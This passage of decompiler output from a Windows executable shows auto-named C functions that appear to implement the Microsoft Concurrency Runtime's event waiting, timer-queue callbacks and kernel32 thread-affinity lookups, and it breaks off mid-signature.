      sub_42EE86(v4);
      v4 = (_DWORD **)v5;
    }
    while ( v5 );
  }
}
// 404CED: using guessed type _DWORD _guard_check_icall_nop();

//----- (0042EE64) --------------------------------------------------------
_DWORD *__thiscall sub_42EE64(_DWORD *Block, char a2)
{
  sub_42ED58(Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (0042EE86) --------------------------------------------------------
int __thiscall sub_42EE86(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[1] + 8))(this[1]);
}

//----- (0042EEA0) --------------------------------------------------------
void __thiscall sub_42EEA0(volatile signed __int32 *Block)
{
  if ( _InterlockedIncrement(Block + 7) == 2 )
    sub_42CF7C((void *)Block);
}

//----- (0042EEBE) --------------------------------------------------------
void __stdcall sub_42EEBE(int a1, void *Block, int a3)
{
  char v3; // bl
  int v4; // [esp+8h] [ebp-4h]

  v3 = 0;
  if ( _InterlockedIncrement((volatile signed __int32 *)Block + 5) == 1 )
  {
    v3 = 1;
    v4 = *((_DWORD *)Block + 1);
    *((_BYTE *)Block + 41) = 1;
    if ( v4 )
    {
      *((_DWORD *)Block + 3) = 0;
      (*(void (__thiscall **)(int))(*(_DWORD *)v4 + 12))(v4);
    }
  }
  sub_42F05F(Block);
  if ( v3 )
    sub_430468(a1, a3);
}

//----- (0042EF1C) --------------------------------------------------------
HMODULE __stdcall sub_42EF1C(int a1, int (__thiscall ***a2)(_DWORD, _DWORD, _DWORD), int a3)
{
  HMODULE result; // eax

  result = (HMODULE)(**a2)(a2, 0, 0);
  if ( (_BYTE)result )
    return sub_430468(a1, a3);
  return result;
}

//----- (0042EF4F) --------------------------------------------------------
void __stdcall sub_42EF4F(void *Block, int a2)
{
  int v2; // ebx
  void *v3; // esi
  void *v4; // eax

  if ( _InterlockedIncrement((volatile signed __int32 *)Block + 5) == 1 )
  {
    v2 = *((_DWORD *)Block + 1);
    v3 = (void *)*((_DWORD *)Block + 4);
    v4 = (void *)sub_42EFCB();
    sub_42FDE8(v4, v3, 0);
    *((_BYTE *)Block + 41) = 1;
    if ( v2 )
    {
      *((_DWORD *)Block + 3) = 0;
      (*(void (__thiscall **)(int))(*(_DWORD *)v2 + 12))(v2);
    }
  }
  sub_42F05F(Block);
}

//----- (0042EFA8) --------------------------------------------------------
void __stdcall sub_42EFA8(PVOID a1, BOOLEAN a2)
{
  (**(void (__thiscall ***)(PVOID, _DWORD, _DWORD))a1)(a1, 0, 0);
}

//----- (0042EFCB) --------------------------------------------------------
int sub_42EFCB()
{
  bool v0; // zf
  char v2[8]; // [esp+0h] [ebp-1Ch] BYREF
  int v3; // [esp+8h] [ebp-14h]
  int (*v4)(); // [esp+Ch] [ebp-10h]
  _DWORD pExceptionObject[3]; // [esp+10h] [ebp-Ch] BYREF

  if ( sub_43268A() >= 3 || dword_492788 )
    return dword_492788;
  if ( _InterlockedCompareExchange(&dword_492784, 1, 0) )
  {
    v3 = 0;
    v4 = sub_43055D;
    while ( !dword_492788 && dword_492784 == 1 )
      sub_42E8F5((int)v2);
  }
  else
  {
    dword_492788 = (int)CreateTimerQueue();
    v0 = dword_492788 == 0;
    if ( dword_492788 )
      goto LABEL_11;
    _InterlockedExchange(&dword_492784, 0);
  }
  v0 = dword_492788 == 0;
LABEL_11:
  if ( v0 )
  {
    sub_4295F3(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
  }
  return dword_492788;
}
// 43268A: using guessed type int sub_43268A(void);
// 492784: using guessed type int dword_492784;
// 492788: using guessed type int dword_492788;
// 42EFCB: using guessed type char var_1C[8];
// 42EFCB: using guessed type _DWORD pExceptionObject[3];

//----- (0042F05F) --------------------------------------------------------
void __thiscall sub_42F05F(void *Block)
{
  int v1; // eax

  v1 = *((_DWORD *)Block + 6);
  if ( _InterlockedIncrement((volatile signed __int32 *)Block + 9) == v1 + 1 )
    j_j_j___free_base(Block);
}

//----- (0042F078) --------------------------------------------------------
char __thiscall sub_42F078(volatile signed __int32 *Block)
{
  int v1; // edi
  signed __int32 v2; // edx
  signed __int32 v3; // eax

  v1 = *((_DWORD *)Block + 7);
  v2 = *((_DWORD *)Block + 8);
  if ( v2 == v1 )
  {
LABEL_4:
    sub_42F05F((void *)Block);
    return 0;
  }
  else
  {
    while ( 1 )
    {
      v3 = _InterlockedCompareExchange(Block + 8, v2 - 1, v2);
      if ( v3 == v2 )
        return 1;
      v2 = v3;
      if ( v3 == v1 )
        goto LABEL_4;
    }
  }
}

//----- (0042F0AD) --------------------------------------------------------
int __thiscall sub_42F0AD(int (__thiscall ****this)(_DWORD, _DWORD, _DWORD), int a2)
{
  return (**this[1])(this[1], a2, this);
}

//----- (0042F0CF) --------------------------------------------------------
char __thiscall sub_42F0CF(_DWORD *this, _DWORD *a2, int a3)
{
  int v3; // edi

  if ( *(_DWORD *)(*(_DWORD *)(a3 + 4) + 8) == 2
    || _InterlockedCompareExchange((volatile signed __int32 *)(*(_DWORD *)(a3 + 4) + 8), 1, 0) == 2 )
  {
    v3 = this[1];
    if ( a2 )
      *a2 = v3;
    else
      (*(void (__thiscall **)(int))(*(_DWORD *)v3 + 12))(v3);
  }
  else if ( a2 )
  {
    *a2 = 0;
  }
  return 0;
}

//----- (0042F129) --------------------------------------------------------
char __thiscall sub_42F129(int this, _DWORD *a2, int a3)
{
  int v4; // edi

  if ( _InterlockedIncrement((volatile signed __int32 *)(this + 32)) != 1 )
    return 0;
  sub_42F4A4(this, a3 != 0);
  *(_BYTE *)(this + 36) = a3 == 0;
  v4 = *(_DWORD *)(this + 4);
  if ( a2 )
    *a2 = v4;
  else
    (*(void (__thiscall **)(int))(*(_DWORD *)v4 + 12))(v4);
  return 1;
}

//----- (0042F182) --------------------------------------------------------
char __thiscall sub_42F182(volatile signed __int32 *Block, _DWORD *a2, int a3)
{
  if ( a2 )
    *a2 = 0;
  if ( _InterlockedIncrement(Block + 8) != *((_DWORD *)Block + 7) )
    return 1;
  (*(void (__thiscall **)(volatile signed __int32 *, _DWORD *, int))(*Block + 20))(Block, a2, a3);
  sub_42F05F((void *)Block);
  return 0;
}

//----- (0042F1C9) --------------------------------------------------------
char __thiscall sub_42F1C9(volatile signed __int32 *Block, _DWORD *a2, int a3)
{
  if ( a2 )
    *a2 = 0;
  if ( _InterlockedIncrement(Block + 8) == *((_DWORD *)Block + 7) )
    (*(void (__thiscall **)(volatile signed __int32 *, _DWORD *, int))(*Block + 20))(Block, a2, a3);
  sub_42F05F((void *)Block);
  return 0;
}

//----- (0042F20C) --------------------------------------------------------
signed __int32 __thiscall sub_42F20C(volatile signed __int32 *this)
{
  unsigned int v1; // edi
  signed __int32 result; // eax
  unsigned int v3; // ebx

  v1 = *this;
  for ( result = _InterlockedCompareExchange(this, 1, *this);
        result != v1;
        result = _InterlockedCompareExchange(this, 1, result) )
  {
    v1 = result;
  }
  if ( v1 > 1 )
  {
    do
    {
      v3 = *(_DWORD *)v1;
      result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(v1 + 4) + 12))(*(_DWORD *)(v1 + 4));
      v1 = v3;
    }
    while ( v3 );
  }
  return result;
}

//----- (0042F250) --------------------------------------------------------
_DWORD *__thiscall sub_42F250(void *Block, _DWORD *a2, int a3)
{
  int v4; // ebx
  _DWORD *result; // eax
  bool v6; // zf
  int v7; // eax
  void *v8; // eax
  HANDLE Timer; // [esp+Ch] [ebp-4h]

  v4 = *((_DWORD *)Block + 1);
  if ( !*((_BYTE *)Block + 40)
    || (result = (_DWORD *)_InterlockedIncrement((volatile signed __int32 *)Block + 5), result == (_DWORD *)1) )
  {
    v6 = *((_DWORD *)Block + 4) == 0;
    *((_DWORD *)Block + 3) = a3;
    if ( !v6 )
    {
      v7 = sub_43268A();
      Timer = (HANDLE)*((_DWORD *)Block + 4);
      if ( v7 < 3 )
      {
        v8 = (void *)sub_42EFCB();
        sub_42FDE8(v8, Timer, (HANDLE)0xFFFFFFFF);
      }
      else
      {
        sub_430244(*((_DWORD *)Block + 4));
      }
      if ( *((_DWORD *)Block + 5) == 1 )
        sub_42F05F(Block);
    }
    if ( *(_DWORD *)(*(_DWORD *)(a3 + 4) + 8) == 2
      || _InterlockedCompareExchange((volatile signed __int32 *)(*(_DWORD *)(a3 + 4) + 8), 1, 0) == 2 )
    {
      result = a2;
      if ( a2 )
        *a2 = v4;
      else
        return (_DWORD *)(*(int (__thiscall **)(int))(*(_DWORD *)v4 + 12))(v4);
    }
    else
    {
      result = a2;
      if ( a2 )
        *a2 = 0;
    }
  }
  return result;
}
// 43268A: using guessed type int sub_43268A(void);

//----- (0042F305) --------------------------------------------------------
_DWORD *__cdecl sub_42F305(_DWORD **a1, char a2)
{
  _DWORD **v2; // esi
  _DWORD *v3; // edi
  _DWORD *v4; // ebx
  char v5; // al

  v2 = a1;
  v3 = 0;
  if ( a1 )
  {
    do
    {
      v4 = *v2;
      if ( a2 )
        v5 = sub_42F38B(v2);
      else
        v5 = sub_42F33F(v2);
      if ( v5 )
      {
        *v2 = v3;
        v3 = v2;
      }
      v2 = (_DWORD **)v4;
    }
    while ( v4 );
  }
  return v3;
}

//----- (0042F33F) --------------------------------------------------------
int __thiscall sub_42F33F(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[1] + 16))(this[1]);
}

//----- (0042F358) --------------------------------------------------------
char __thiscall sub_42F358(_DWORD *this)
{
  if ( this[8] >= this[7] )
  {
    (*(void (__thiscall **)(_DWORD *))(*this + 4))(this);
    return 0;
  }
  if ( *((_BYTE *)this + 41) )
  {
    (*(void (__thiscall **)(_DWORD *))(*this + 8))(this);
    return 0;
  }
  return 1;
}

//----- (0042F38B) --------------------------------------------------------
int __thiscall sub_42F38B(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[1] + 12))(this[1]);
}

//----- (0042F3A4) --------------------------------------------------------
char __thiscall sub_42F3A4(_BYTE *this)
{
  if ( !this[36] )
    return 1;
  (*(void (__thiscall **)(_BYTE *))(*(_DWORD *)this + 8))(this);
  return 0;
}

//----- (0042F3C8) --------------------------------------------------------
char __thiscall sub_42F3C8(_BYTE *this)
{
  char v3[4]; // [esp+4h] [ebp-4h] BYREF

  if ( !this[41] )
    return 1;
  if ( (**(unsigned __int8 (__thiscall ***)(_BYTE *, char *, _DWORD))this)(this, v3, 0) )
    (*(void (__thiscall **)(_BYTE *))(*(_DWORD *)this + 8))(this);
  return 0;
}
// 42F3C8: using guessed type char var_4[4];

//----- (0042F40B) --------------------------------------------------------
char __thiscall sub_42F40B(_DWORD *this)
{
  char v2[4]; // [esp+4h] [ebp-4h] BYREF

  if ( this[8] < this[7] && !*((_BYTE *)this + 41) )
    return 1;
  (*(void (__thiscall **)(_DWORD *, char *, _DWORD))*this)(this, v2, 0);
  return 0;
}
// 42F40B: using guessed type char var_4[4];

//----- (0042F441) --------------------------------------------------------
bool __thiscall sub_42F441(char *Parameter, DWORD DueTime)
{
  int *v3; // edi
  int v4; // eax
  void *v6; // eax

  if ( !Parameter[24] )
    return 0;
  v3 = (int *)(Parameter + 20);
  if ( sub_43268A() < 3 )
  {
    v6 = (void *)sub_42EFCB();
    return sub_42FDC8((PHANDLE)Parameter + 5, v6, sub_42EFA8, Parameter, DueTime, 0, 0x20u);
  }
  else
  {
    v4 = sub_4303D0(DueTime, (int)sub_42EF1C, (int)Parameter, 0);
    *v3 = v4;
    return v4 != 0;
  }
}
// 43268A: using guessed type int sub_43268A(void);

//----- (0042F4A4) --------------------------------------------------------
void __thiscall sub_42F4A4(int this, unsigned __int8 a2)
{
  void *v3; // esi
  void *v4; // eax

  if ( *(_BYTE *)(this + 24) )
  {
    if ( sub_43268A() < 3 )
    {
      v3 = *(void **)(this + 20);
      v4 = (void *)sub_42EFCB();
      sub_42FDE8(v4, v3, (HANDLE)((a2 ^ 1) - 1));
    }
    else if ( a2 )
    {
      if ( *(_DWORD *)(this + 20) )
        sub_430244(*(_DWORD *)(this + 20));
    }
  }
}
// 43268A: using guessed type int sub_43268A(void);

//----- (0042F4F1) --------------------------------------------------------
void __thiscall sub_42F4F1(_DWORD *this)
{
  _DWORD **v2; // edi
  _DWORD **v3; // ebx
  void *v4[7]; // [esp+4h] [ebp-20h] BYREF
  int v5; // [esp+20h] [ebp-4h] BYREF

  if ( *this )
  {
    sub_42E4AD((int *)v4, (int)(this + 1));
    v2 = (_DWORD **)*this;
    *this = 0;
    sub_42E4DF(v4);
    if ( v2 )
    {
      do
      {
        v5 = 0;
        sub_42F0AD((int (__thiscall ****)(_DWORD, _DWORD, _DWORD))v2, (int)&v5);
        v3 = (_DWORD **)*v2;
        sub_42EE86(v2);
        if ( v5 )
          (*(void (__thiscall **)(int))(*(_DWORD *)v5 + 12))(v5);
        v2 = v3;
      }
      while ( v3 );
    }
  }
}

//----- (0042F55C) --------------------------------------------------------
void __thiscall sub_42F55C(_DWORD *this)
{
  _DWORD **v2; // edi
  _DWORD *v3; // esi
  void *v4[7]; // [esp+10h] [ebp-2Ch] BYREF
  int v5[4]; // [esp+2Ch] [ebp-10h] BYREF

  if ( *this )
  {
    sub_42E4AD((int *)v4, (int)(this + 1));
    v2 = (_DWORD **)*this;
    v5[3] = 0;
    v5[0] = 0;
    if ( v2 )
    {
      while ( !(unsigned __int8)sub_42F0AD((int (__thiscall ****)(_DWORD, _DWORD, _DWORD))v2, (int)v5) )
      {
        v3 = *v2;
        sub_42EE86(v2);
        v2 = (_DWORD **)v3;
        if ( !v3 )
          goto LABEL_5;
      }
      *this = *v2;
      sub_42EE86(v2);
      (*(void (__thiscall **)(int))(*(_DWORD *)v5[0] + 12))(v5[0]);
    }
    else
    {
LABEL_5:
      *this = 0;
    }
    sub_42E4DF(v4);
  }
}

//----- (0042F5DA) --------------------------------------------------------
void __thiscall sub_42F5DA(volatile __int32 *this)
{
  int v1; // ebx
  int v2; // esi
  _DWORD *v3; // edi
  int v4; // ecx
  _DWORD *v5; // eax
  unsigned int v6; // eax
  void *v7; // esp
  _DWORD *v8; // ebx
  _DWORD *v9; // eax
  volatile __int32 *v10; // ecx
  _DWORD v11[4]; // [esp+0h] [ebp-60h] BYREF
  void *v12[7]; // [esp+10h] [ebp-50h] BYREF
  _DWORD pExceptionObject[4]; // [esp+2Ch] [ebp-34h] BYREF
  int v14; // [esp+3Ch] [ebp-24h]
  int v15; // [esp+40h] [ebp-20h]
  int v16; // [esp+44h] [ebp-1Ch] BYREF
  volatile __int32 *v17; // [esp+48h] [ebp-18h]
  _DWORD *v18; // [esp+4Ch] [ebp-14h]
  int v19; // [esp+5Ch] [ebp-4h]

  v17 = this;
  pExceptionObject[3] = &Concurrency::details::_MallocaArrayHolder<Concurrency::Context *>::`vftable';
  v1 = 0;
  v14 = 0;
  v2 = 0;
  v15 = 0;
  v19 = 0;
  sub_42E4AD((int *)v12, (int)(this + 2));
  LOBYTE(v19) = 1;
  v3 = (_DWORD *)_InterlockedExchange(v17, 1);
  if ( (unsigned int)v3 <= 1 )
    goto LABEL_17;
  v4 = 0;
  v5 = v3;
  do
  {
    v5 = (_DWORD *)*v5;
    ++v4;
  }
  while ( v5 );
  v6 = 4 * v4 < (unsigned int)(4 * v4 + 8) ? 4 * v4 + 8 : 0;
  if ( !v6 )
    goto LABEL_24;
  if ( v6 > 0x400 )
  {
    v9 = malloc(v6);
    v8 = v9;
    if ( !v9 )
      goto LABEL_24;
    *v9 = 56797;
  }
  else
  {
    v7 = alloca(v6);
    v8 = v11;
    if ( !v11 )
      goto LABEL_24;
    v11[0] = 52428;
  }
  v1 = (int)(v8 + 2);
  if ( !v1 )
  {
LABEL_24:
    sub_4295F3(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
  }
  v15 = 0;
  v2 = 0;
  v14 = v1;
  do
  {
    v18 = (_DWORD *)*v3;
    if ( (unsigned __int8)sub_42F0AD((int (__thiscall ****)(_DWORD, _DWORD, _DWORD))v3, (int)&v16) )
    {
      v10 = v17;
      *v3 = *((_DWORD *)v17 + 1);
      *((_DWORD *)v10 + 1) = v3;
    }
    if ( v16 )
      *(_DWORD *)(v1 + 4 * v2++) = v16;
    v3 = v18;
  }
  while ( v18 );
LABEL_17:
  LOBYTE(v19) = 0;
  sub_42E4DF(v12);
  while ( v2 )
  {
    v18 = (_DWORD *)(v2 - 1);
    (*(void (__thiscall **)(_DWORD, _DWORD))(**(_DWORD **)(v1 + 4 * (v2 - 1)) + 12))(
      *(_DWORD *)(v1 + 4 * (v2 - 1)),
      v11[0]);
    v2 = (int)v18;
  }
  if ( v14 )
  {
    if ( *(_DWORD *)(v14 - 8) == 56797 )
      j___free_base((void *)(v14 - 8));
  }
}
// 470DF0: using guessed type void *Concurrency::details::_MallocaArrayHolder<Concurrency::Context *>::`vftable';

//----- (0042F723) --------------------------------------------------------
signed __int32 __thiscall sub_42F723(_DWORD ***this, void *a2)
{
  char v4[12]; // [esp+10h] [ebp-50h] BYREF
  _DWORD *v5; // [esp+1Ch] [ebp-44h] BYREF
  void *v6[9]; // [esp+38h] [ebp-28h] BYREF
  int v7; // [esp+5Ch] [ebp-4h]

  sub_42ECA3((int)v4, 0);
  sub_42E4AD((int *)v6, (int)(this + 1));
  v7 = 0;
  v5 = sub_42F305(*this, 1);
  *this = &v5;
  sub_42EB6F(a2);
  v7 = -1;
  sub_42E4DF(v6);
  sub_4306A8();
  return sub_42EA98(a2);
}
// 42F723: using guessed type char var_50[12];

//----- (0042F787) --------------------------------------------------------
unsigned int __thiscall sub_42F787(_DWORD ***this, DWORD DueTime)
{
  void *v4[7]; // [esp+10h] [ebp-50h] BYREF
  _DWORD v5[4]; // [esp+2Ch] [ebp-34h] BYREF
  int v6[2]; // [esp+3Ch] [ebp-24h] BYREF
  signed __int32 v7; // [esp+44h] [ebp-1Ch] BYREF
  int v8[2]; // [esp+48h] [ebp-18h] BYREF
  int v9[3]; // [esp+50h] [ebp-10h] BYREF
  int v10; // [esp+5Ch] [ebp-4h]

  if ( DueTime == -1 )
  {
    v5[3] = sub_43055D;
    v9[0] = 0;
    v5[2] = 0;
    while ( *this != (_DWORD **)1 )
    {
      if ( !sub_42E97E(v5) )
      {
        sub_42ECFA(v6);
        v6[0] = (int)&Concurrency::details::SingleWaitBlock::`vftable';
        v8[1] = (int)v6;
        sub_42E4AD((int *)v4, (int)(this + 2));
        v10 = 0;
        if ( *this == (_DWORD **)1 )
        {
          LOBYTE(v9[0]) = 1;
        }
        else
        {
          v8[0] = (int)sub_42F305(*this, 1);
          *this = (_DWORD **)v8;
        }
        v10 = -1;
        sub_42E4DF(v4);
        if ( !LOBYTE(v9[0]) && v7 != 1 && _InterlockedCompareExchange(&v7, 2, 0) != 1 )
          sub_4306A8();
        return 0;
      }
    }
  }
  else
  {
    if ( DueTime )
    {
      v9[0] = (int)this;
      return sub_42F950(v9, 1u, 1, DueTime);
    }
    if ( *this != (_DWORD **)1 )
      return -1;
  }
  return 0;
}
// 470D6C: using guessed type void *Concurrency::details::SingleWaitBlock::`vftable';
// 42F787: using guessed type int var_10[3];

//----- (0042F868) --------------------------------------------------------
char __thiscall sub_42F868(_DWORD ***this, void *a2, DWORD DueTime)
{
  void *v4; // eax
  int v5; // edi
  bool v6; // bl
  void *v7[7]; // [esp+10h] [ebp-3Ch] BYREF
  void *pExceptionObject[4]; // [esp+2Ch] [ebp-20h] BYREF
  _DWORD ***v9; // [esp+3Ch] [ebp-10h]
  int v10; // [esp+48h] [ebp-4h]

  v9 = this;
  if ( !DueTime )
    return 0;
  if ( DueTime == -1 )
  {
    sub_42F723(this, a2);
    return 1;
  }
  else
  {
    v4 = operator new(0x28u);
    pExceptionObject[3] = v4;
    v5 = 0;
    v10 = 0;
    if ( v4 )
      v5 = sub_42ECA3((int)v4, 1);
    v10 = -1;
    sub_42E4AD((int *)v7, (int)(v9 + 1));
    v10 = 1;
    *(_DWORD *)(v5 + 12) = sub_42F305(*v9, 1);
    *v9 = (_DWORD **)(v5 + 12);
    if ( !sub_42F441((char *)v5, DueTime) )
    {
      sub_4295F3(pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
    }
    sub_42EB6F(a2);
    v10 = -1;
    sub_42E4DF(v7);
    sub_4306A8();
    v6 = *(_BYTE *)(v5 + 36) == 0;
    (*(void (__thiscall **)(int))(*(_DWORD *)v5 + 8))(v5);
    sub_42EA98(a2);
    return v6;
  }
}

//----- (0042F950) --------------------------------------------------------
unsigned int __cdecl sub_42F950(_DWORD *a1, unsigned int a2, char a3, DWORD DueTime)
{
  DWORD v5; // edi
  unsigned int v6; // ebx
  unsigned int i; // eax
  bool v8; // al
  unsigned int v9; // edx
  _DWORD *v10; // eax
  char *v11; // ecx
  _DWORD *v12; // eax
  char *v13; // ecx
  unsigned int v14; // eax
  int v15; // edi
  char *v16; // ebx
  unsigned int v17; // esi
  HANDLE *v18; // esi
  int v19; // eax
  int v20; // eax
  void *v21; // eax
  HANDLE v22; // eax
  PVOID v23; // [esp-10h] [ebp-90h]
  void *v24[7]; // [esp+10h] [ebp-70h] BYREF
  int v25; // [esp+2Ch] [ebp-54h] BYREF
  unsigned int v26; // [esp+30h] [ebp-50h]
  int v27; // [esp+38h] [ebp-48h]
  PVOID Parameter; // [esp+3Ch] [ebp-44h]
  int v29; // [esp+40h] [ebp-40h]
  _DWORD pExceptionObject[3]; // [esp+48h] [ebp-38h] BYREF
  _DWORD v31[3]; // [esp+54h] [ebp-2Ch] BYREF
  unsigned int v32; // [esp+60h] [ebp-20h]
  int v33; // [esp+64h] [ebp-1Ch] BYREF
  _DWORD ***v34; // [esp+68h] [ebp-18h]
  char *v35; // [esp+6Ch] [ebp-14h]
  char v36; // [esp+73h] [ebp-Dh]
  int v37; // [esp+7Ch] [ebp-4h]

  if ( !a1 )
    goto LABEL_54;
  if ( !a2 )
    return 0;
  v5 = DueTime;
  v6 = -1;
  if ( a2 == 1 && (!DueTime || DueTime == -1) )
  {
    if ( *a1 )
      return sub_42F787(DueTime);
LABEL_54:
    sub_429626((std::exception *)v31, "pEvents");
    _CxxThrowException(v31, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  for ( i = 0; i < a2; ++i )
  {
    if ( !a1[i] )
      goto LABEL_54;
  }
  v8 = DueTime && DueTime != -1;
  sub_42EC1C(&v25, a3, a2, DueTime != -1, v8);
  v37 = 0;
  v9 = 0;
  v36 = 0;
  v32 = 0;
  v35 = (char *)(v25 + v27);
  while ( 1 )
  {
    v34 = (_DWORD ***)a1[v9];
    sub_42E4AD((int *)v24, (int)(v34 + 2));
    ++v29;
    LOBYTE(v37) = 1;
    if ( *v34 == (_DWORD **)1 )
      break;
    v12 = sub_42F305(*v34, 1);
    v13 = v35;
    *(_DWORD *)v35 = v12;
    *v34 = (_DWORD **)v13;
LABEL_25:
    LOBYTE(v37) = 0;
    sub_42E4DF(v24);
    v9 = v32 + 1;
    v32 = v9;
    v35 += v26;
    if ( v9 >= a2 )
      goto LABEL_34;
  }
  if ( a3 )
  {
    if ( (unsigned __int8)sub_42F0AD((int (__thiscall ****)(_DWORD, _DWORD, _DWORD))v35, (int)&v33) )
    {
      v10 = sub_42F305(v34[1], 0);
      v11 = v35;
      *(_DWORD *)v35 = v10;
      v34[1] = (_DWORD **)v11;
    }
    if ( v33 )
      v36 = 1;
    goto LABEL_25;
  }
  sub_42F0AD((int (__thiscall ****)(_DWORD, _DWORD, _DWORD))v35, (int)&v33);
  if ( v33 )
    v36 = 1;
  v14 = v32 + 1;
  if ( v32 + 1 < a2 )
  {
    v15 = v29;
    v16 = (char *)(v25 + v27 + v14 * v26);
    v17 = a2 - v14;
    do
    {
      v29 = ++v15;
      sub_42F0AD((int (__thiscall ****)(_DWORD, _DWORD, _DWORD))v16, (int)&v33);
      v16 += v26;
      --v17;
    }
    while ( v17 );
    v5 = DueTime;
    v6 = -1;
  }
  LOBYTE(v37) = 0;
  sub_42E4DF(v24);
LABEL_34:
  if ( v36
    || *((_DWORD *)Parameter + 2) == 1
    || _InterlockedCompareExchange((volatile signed __int32 *)Parameter + 2, 2, 0) == 1 )
  {
    v18 = (HANDLE *)Parameter;
  }
  else
  {
    if ( v5 )
    {
      if ( v5 == -1 || *((_DWORD *)Parameter + 5) )
      {
        v18 = (HANDLE *)Parameter;
      }
      else
      {
        v19 = sub_43268A();
        v18 = (HANDLE *)Parameter;
        if ( v19 < 3 )
        {
          v23 = Parameter;
          v21 = (void *)sub_42EFCB();
          if ( !sub_42FDC8(v18 + 4, v21, (WAITORTIMERCALLBACK)sub_42EF4F, v23, v5, 0, 0x20u) )
          {
            sub_4295F3(pExceptionObject);
            _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
          }
        }
        else
        {
          v20 = sub_4303D0(v5, (int)sub_42EEBE, (int)Parameter, 0);
          v18[4] = (HANDLE)v20;
          if ( !v20 )
          {
            sub_4295F3(v31);
            _CxxThrowException(v31, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
          }
        }
        ++v29;
      }
    }
    else
    {
      v18 = (HANDLE *)Parameter;
      if ( _InterlockedIncrement((volatile signed __int32 *)Parameter + 5) == 1 )
      {
        v18[3] = 0;
        *((_BYTE *)v18 + 41) = 1;
        goto LABEL_51;
      }
    }
    sub_4306A8();
  }
LABEL_51:
  v22 = v18[3];
  if ( v22 )
    v6 = ((unsigned int)v22 - v27 - v25) / v26;
  sub_42ED78(&v25);
  return v6;
}
// 42F9A1: conditional instruction was optimized away because %arg_4.4!=0
// 42F9E6: conditional instruction was optimized away because %arg_4.4!=0
// 42F787: using guessed type _DWORD __stdcall sub_42F787(DWORD DueTime);
// 43268A: using guessed type int sub_43268A(void);
// 42F950: using guessed type _DWORD var_2C[3];
// 42F950: using guessed type _DWORD pExceptionObject[3];

//----- (0042FC40) --------------------------------------------------------
void __thiscall sub_42FC40(char *this)
{
  int v2; // ecx

  v2 = *(_DWORD *)this;
  if ( v2 )
  {
    **(_DWORD **)(v2 + 256) = 0;
    sub_4301F5(v2, 1);
  }
  sub_42E4D7((LPCRITICAL_SECTION)(this + 4));
}

//----- (0042FC8F) --------------------------------------------------------
int sub_42FC8F()
{
  HMODULE ModuleHandleW; // esi
  BOOL (__stdcall *SetThreadGroupAffinity)(HANDLE, const GROUP_AFFINITY *, PGROUP_AFFINITY); // ebx
  BOOL (__stdcall *GetThreadGroupAffinity)(HANDLE, PGROUP_AFFINITY); // eax
  BOOL (__stdcall *v3)(HANDLE, PGROUP_AFFINITY); // edi
  void (__stdcall *GetCurrentProcessorNumberEx)(PPROCESSOR_NUMBER); // eax
  int result; // eax
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+Ch] [ebp-10h] BYREF

  ModuleHandleW = GetModuleHandleW(L"kernel32.dll");
  SetThreadGroupAffinity = (BOOL (__stdcall *)(HANDLE, const GROUP_AFFINITY *, PGROUP_AFFINITY))GetProcAddress(
                                                                                                  ModuleHandleW,
                                                                                                  "SetThreadGroupAffinity");
  GetThreadGroupAffinity = (BOOL (__stdcall *)(HANDLE, PGROUP_AFFINITY))GetProcAddress(
                                                                          ModuleHandleW,
                                                                          "GetThreadGroupAffinity");
  v3 = GetThreadGroupAffinity;
  if ( !SetThreadGroupAffinity || !GetThreadGroupAffinity )
  {
    LastError = GetLastError();
    if ( LastError <= 0 )
      goto LABEL_9;
LABEL_8:
    LastError = (unsigned __int16)LastError | 0x80070000;
LABEL_9:
    sub_43065D(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  dword_492794 = sub_430237((int)SetThreadGroupAffinity);
  dword_492798 = sub_430237((int)v3);
  GetCurrentProcessorNumberEx = (void (__stdcall *)(PPROCESSOR_NUMBER))GetProcAddress(
                                                                         ModuleHandleW,
                                                                         "GetCurrentProcessorNumberEx");
  if ( !GetCurrentProcessorNumberEx )
  {
    LastError = GetLastError();
    if ( LastError <= 0 )
      goto LABEL_9;
    goto LABEL_8;
  }
  result = sub_430237((int)GetCurrentProcessorNumberEx);
  dword_492790 = result;
  return result;
}
// 492790: using guessed type int dword_492790;
// 492794: using guessed type int dword_492794;
// 492798: using guessed type int dword_492798;
// 42FC8F: using guessed type _DWORD pExceptionObject[4];

//----- (0042FD38) --------------------------------------------------------
BOOL __cdecl sub_42FD38(HANDLE TimerQueue, HANDLE Timer, ULONG DueTime, ULONG Period)
{
  return ChangeTimerQueueTimer(TimerQueue, Timer, DueTime, Period);
}

//----- (0042FD4F) --------------------------------------------------------
BOOL __cdecl sub_42FD4F(HANDLE hObject)
{
  return CloseHandle(hObject);
}

//----- (0042FD5D) --------------------------------------------------------
int __cdecl sub_42FD5D(unsigned __int8 a1)
{
  int result; // eax
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+0h] [ebp-10h] BYREF

  result = __crtCreateEventExW(0, 0, 2 * a1, 2031618);
  if ( !result )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_43065D(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return result;
}
// 42FD5D: using guessed type _DWORD pExceptionObject[4];

//----- (0042FDC8) --------------------------------------------------------
BOOL __cdecl sub_42FDC8(
        PHANDLE phNewTimer,
        HANDLE TimerQueue,
        WAITORTIMERCALLBACK Callback,
        PVOID Parameter,
        DWORD DueTime,
        DWORD Period,
        ULONG Flags)
{
